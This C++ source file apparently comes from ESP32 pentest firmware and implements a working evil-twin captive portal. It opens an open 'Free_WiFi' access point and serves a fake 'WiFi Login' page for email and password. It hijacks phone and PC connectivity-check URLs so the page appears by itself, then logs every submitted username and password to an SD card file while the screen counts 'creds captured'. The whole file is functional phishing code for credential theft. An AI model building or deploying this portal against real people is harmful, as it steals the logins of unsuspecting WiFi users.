#if !LITE_VERSION
#include "arsenal.h"
#include "core/display.h"
#include "core/mykeyboard.h"
#include "core/sd_functions.h"
#include "core/wifi/wifi_common.h"
#include <AsyncTCP.h>
#include <ESPAsyncWebServer.h>
#include <SD.h>
#include <WiFi.h>
#include <globals.h>

static AsyncWebServer *portalServer = nullptr;
static const char *PORTAL_DIR = "/arsenal/portals";
static const char *CREDS_FILE = "/arsenal/creds.txt";
static int credsCapture = 0;
static String activeTemplate = "";


static const char DEFAULT_PORTAL[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>WiFi Login</title>
<style>
body{font-family:Arial,sans-serif;background:#1a1a2e;color:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}
.box{background:#16213e;padding:30px;border-radius:12px;width:300px;box-shadow:0 4px 20px rgba(0,0,0,0.5)}
h2{text-align:center;margin-bottom:20px;color:#00ff88}
input{width:100%;padding:12px;margin:8px 0;border:1px solid #333;border-radius:6px;background:#0f3460;color:#fff;box-sizing:border-box}
button{width:100%;padding:12px;background:#00ff88;color:#0a0a0f;border:none;border-radius:6px;font-weight:bold;cursor:pointer;margin-top:12px}
.logo{text-align:center;font-size:2rem;margin-bottom:10px}
</style>
</head>
<body>
<div class="box">
<div class="logo">&#128274;</div>
<h2>Connect to WiFi</h2>
<form method="POST" action="/login">
<input name="email" placeholder="Email or Username" required>
<input name="password" type="password" placeholder="Password" required>
<button type="submit">Sign In</button>
</form>
<p style="text-align:center;font-size:0.8rem;color:#666;margin-top:12px">Secure connection required</p>
</div>
</body>
</html>
)rawliteral";

static const char SUCCESS_PAGE[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html><head><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Connected</title>
<style>body{font-family:Arial;background:#1a1a2e;color:#fff;text-align:center;padding-top:100px}
h1{color:#00ff88}</style></head>
<body><h1>&#10004; Connected!</h1><p>You may now browse the internet.</p></body></html>
)rawliteral";

static void logCredential(String email, String password) {
    if (!setupSdCard()) return;


    if (!SD.exists("/arsenal")) SD.mkdir("/arsenal");

    File f = SD.open(CREDS_FILE, FILE_APPEND);
    if (f) {
        f.printf("[%lu] Portal: %s | User: %s | Pass: %s\n",
                 millis() / 1000, activeTemplate.c_str(),
                 email.c_str(), password.c_str());
        f.close();
        credsCapture++;
    }
}

static String loadTemplate(String filename) {
    if (!setupSdCard()) return String(DEFAULT_PORTAL);

    String path = String(PORTAL_DIR) + "/" + filename;
    File f = SD.open(path, FILE_READ);
    if (!f) return String(DEFAULT_PORTAL);

    String content = f.readString();
    f.close();
    return content;
}

static void startPortalServer(String templateHTML) {
    if (portalServer) {
        portalServer->end();
        delete portalServer;
    }

    portalServer = new AsyncWebServer(80);


    portalServer->on("/", HTTP_GET, [templateHTML](AsyncWebServerRequest *request) {
        request->send(200, "text/html", templateHTML);
    });


    portalServer->on("/generate_204", HTTP_GET, [templateHTML](AsyncWebServerRequest *request) {
        request->send(200, "text/html", templateHTML);
    });
    portalServer->on("/hotspot-detect.html", HTTP_GET, [templateHTML](AsyncWebServerRequest *request) {
        request->send(200, "text/html", templateHTML);
    });
    portalServer->on("/connecttest.txt", HTTP_GET, [templateHTML](AsyncWebServerRequest *request) {
        request->send(200, "text/html", templateHTML);
    });


    portalServer->on("/login", HTTP_POST, [](AsyncWebServerRequest *request) {
        String email = request->hasArg("email") ? request->arg("email") : "N/A";
        String password = request->hasArg("password") ? request->arg("password") : "N/A";
        logCredential(email, password);
        request->send(200, "text/html", SUCCESS_PAGE);
    });


    portalServer->onNotFound([templateHTML](AsyncWebServerRequest *request) {
        request->send(200, "text/html", templateHTML);
    });

    portalServer->begin();
}

void arsenal_captive_portal_templates(void) {
    ARSENAL_SAFE_RUN([]() {
        credsCapture = 0;


        options.clear();
        options.push_back({"Default (Generic Login)", []() {
            activeTemplate = "default";
        }});

        if (setupSdCard() && SD.exists(PORTAL_DIR)) {
            File dir = SD.open(PORTAL_DIR);
            while (true) {
                File entry = dir.openNextFile();
                if (!entry) break;
                String name = entry.name();
                if (name.endsWith(".html") || name.endsWith(".htm")) {
                    options.push_back({name, [name]() {
                        activeTemplate = name;
                    }});
                }
                entry.close();
            }
            dir.close();
        }

        loopOptions(options, MENU_TYPE_SUBMENU, "Select Template");

        if (activeTemplate.length() == 0) return;


        String html;
        if (activeTemplate == "default") {
            html = String(DEFAULT_PORTAL);
        } else {
            html = loadTemplate(activeTemplate);
        }


        WiFi.mode(WIFI_AP);
        WiFi.softAP("Free_WiFi", "");
        delay(100);


        startPortalServer(html);


        while (true) {
            drawMainBorderWithTitle("Captive Portal");
            int y = 45;
            int padX = 12;

            tft.setTextColor(TFT_GREEN, bruceConfig.bgColor);
            tft.setTextSize(FP);
            tft.setCursor(padX, y);
            tft.print("Status: ACTIVE");
            y += 16;

            tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
            tft.setCursor(padX, y);
            tft.print("AP: Free_WiFi (open)");
            y += 14;

            tft.setCursor(padX, y);
            tft.print("IP: " + WiFi.softAPIP().toString());
            y += 14;

            tft.setCursor(padX, y);
            tft.printf("Clients: %d", WiFi.softAPgetStationNum());
            y += 14;

            tft.setCursor(padX, y);
            tft.print("Template: " + activeTemplate.substring(0, 16));
            y += 18;

            tft.setTextColor(TFT_YELLOW, bruceConfig.bgColor);
            tft.setCursor(padX, y);
            tft.printf("Creds captured: %d", credsCapture);
            y += 14;

            tft.setCursor(padX, y);
            tft.print("Saved to: " + String(CREDS_FILE));

            tft.setTextColor(TFT_RED, bruceConfig.bgColor);
            tft.drawCentreString(String("Esc to stop"), tftWidth / 2, tftHeight - 20, 1);

            if (check(EscPress)) break;
            esp_task_wdt_reset();
            delay(500);
        }


        portalServer->end();
        delete portalServer;
        portalServer = nullptr;
        WiFi.softAPdisconnect(true);

        if (credsCapture > 0) {
            displayRedStripe(String(credsCapture) + " creds saved!");
        } else {
            displayRedStripe("Portal stopped");
        }
        delay(1500);
    });
}
#endif
